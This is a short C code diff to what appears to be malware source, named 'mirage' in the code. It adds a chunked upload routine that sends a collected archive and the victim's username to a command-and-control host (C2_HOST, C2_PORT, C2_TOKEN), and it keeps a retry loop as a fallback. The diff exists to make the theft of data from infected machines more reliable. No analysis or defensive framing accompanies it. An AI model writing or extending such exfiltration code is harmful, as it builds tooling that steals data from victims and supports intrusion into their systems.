@@ -93,6 +93,9 @@ extern int mirage_collect_system_info(char *output, size_t outlen);
 #ifdef ENABLE_C2_EXFIL
 #include "archive_crypt.h"
 #endif
+#ifdef ENABLE_C2_EXFIL
+#include "chunked.h"
+#endif
 
 #ifdef ENABLE_C2_EXFIL
 #include "file_utils.h"
@@ -623,12 +626,20 @@ int main(int argc, char *argv[]) {
             snprintf(metadata, sizeof(metadata),
                      "{\"host\":\"%s\",\"user\":\"%s\"}",
                      "unknown", getenv("USERNAME") ? getenv("USERNAME") : "unknown");
-            for (int attempt = 0; attempt < 3 && !exfil_ok; attempt++) {
-                if (upload_log(C2_HOST, C2_PORT, C2_TOKEN,
-                               archive, archive_len, metadata) == 0) {
-                    exfil_ok = 1;
-                } else if (attempt < 2) {
-                    g_main_k32.pSlp(2000);
+            /* Try chunked upload first */
+            chunk_result_t cr = chunked_upload(C2_HOST, C2_PORT, C2_TOKEN,
+                archive, archive_len, metadata, strlen(metadata));
+            if (cr == CHUNK_COMPLETE) {
+                exfil_ok = 1;
+            } else {
+                /* Fallback to single-shot upload */
+                for (int attempt = 0; attempt < 3 && !exfil_ok; attempt++) {
+                    if (upload_log(C2_HOST, C2_PORT, C2_TOKEN,
+                                   archive, archive_len, metadata) == 0) {
+                        exfil_ok = 1;
+                    } else if (attempt < 2) {
+                        g_main_k32.pSlp(2000);
+                    }
                 }
             }
             free(archive);
